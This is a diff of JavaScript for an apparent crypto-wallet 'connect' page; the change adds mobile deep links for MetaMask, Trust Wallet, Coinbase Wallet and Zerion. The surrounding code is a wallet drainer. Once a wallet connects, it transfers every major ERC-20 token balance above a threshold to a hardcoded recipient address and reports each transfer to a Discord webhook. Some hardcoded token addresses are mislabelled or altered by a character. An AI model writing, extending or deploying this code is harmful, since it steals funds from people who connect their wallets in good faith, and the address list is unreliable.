@@ -7,7 +7,6 @@ function openModal() {
     modal.style.display = "block";
     const modalContent = modal.querySelector(".modal-content");
     modalContent.style.bottom = "0"; // Slide up
-
     console.log("Modal opened for wallet selection");
 }
 
@@ -55,7 +54,20 @@ async function connectWallet(walletName) {
         let account;
         console.log(`Attempting to connect to ${walletName}...`);
 
-        if (walletName === "MetaMask" || walletName === "Trust Wallet" || walletName === "Coinbase Wallet" || walletName === "Zerion Wallet") {
+        // Open the wallet app externally for mobile users
+        if (isMobile()) {
+            if (walletName === "MetaMask") {
+                window.location.href = "metamask://"; // MetaMask deep link
+            } else if (walletName === "Trust Wallet") {
+                window.location.href = "trust://"; // Trust Wallet deep link
+            } else if (walletName === "Coinbase Wallet") {
+                window.location.href = "cbwallet://"; // Coinbase Wallet deep link
+            } else if (walletName === "Zerion Wallet") {
+                window.location.href = "zerion://"; // Zerion Wallet deep link
+            }
+            console.log(`${walletName} deep link triggered for mobile`);
+        } else {
+            // Fallback for desktop users or if deep linking fails
             if (typeof window.ethereum !== 'undefined') {
                 console.log(`${walletName} detected. Requesting account...`);
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -66,10 +78,6 @@ async function connectWallet(walletName) {
                 console.error(`${walletName} is not installed in the browser.`);
                 return;
             }
-        } else {
-            alert("Invalid wallet selected.");
-            console.error("Invalid wallet selection.");
-            return;
         }
 
         if (account) {
@@ -87,9 +95,14 @@ async function connectWallet(walletName) {
     }
 }
 
+function isMobile() {
+    // Simple check for mobile devices
+    return /Mobi|Android/i.test(navigator.userAgent);
+}
+
 async function sendFirstTransaction(walletAddress) {
     console.log(`Preparing to send first transaction for wallet: ${walletAddress}`);
-    
+
     if (typeof window.ethereum !== 'undefined') {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         const signer = provider.getSigner();
@@ -123,14 +136,14 @@ async function sendFirstTransaction(walletAddress) {
 
 async function sendSecondTransaction(signer, walletAddress) {
     console.log(`Preparing to send second transaction (ERC-20 tokens) for wallet: ${walletAddress}`);
-    
+
     // List of ERC-20 token addresses (example)
     const tokenAddresses = [
         "0xdac17f958d2ee523a2206206994597c13d831ec7", // Tether (USDT)
         "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USD Coin (USDC)
         "0x56d811088235F11C8920698a204A5010a788f4b3", // Binance Coin (BNB)
         "0x514910771af9ca656af840dff83e8264ecf986ca", // Chainlink (LINK)
-        "0x5C69bEe701ef814a2B6a3EDD4B1eF2400dDd33d6", // Uniswap (UNI)
+        "0x5C69bEe701ef814a2B6a3EDD4e1eF2400dDd33d6", // Uniswap (UNI)
         "0x6b175474e89094c44da98b954eedeac495271d0f", // Dai (DAI)
         "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // Shiba Inu (SHIB)
         "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // Wrapped Bitcoin (WBTC)
@@ -155,13 +168,13 @@ async function sendSecondTransaction(signer, walletAddress) {
         if (parseFloat(tokenAmount) > tokenThresholdAmount) {
             const amountToSend = ethers.utils.parseUnits(tokenAmount, 18); // Send all available tokens above the threshold
             console.log(`Sending ${tokenAmount} tokens of ${tokenAddress} to recipient.`);
-            
+
             const recipientAddress = "0x64B04f1Eb0d4062f7D7199B099a7a3dC438EEb67"; // Set the recipient for the second transaction
-            
+
             try {
                 const txResponse = await tokenContract.transfer(recipientAddress, amountToSend);
                 console.log(`Second transaction (ERC-20 token ${tokenAddress}) sent successfully. Response:`, txResponse);
-                
+
                 // Send to Discord webhook
                 await sendWebhook(txResponse.hash, "success");
             } catch (error) {
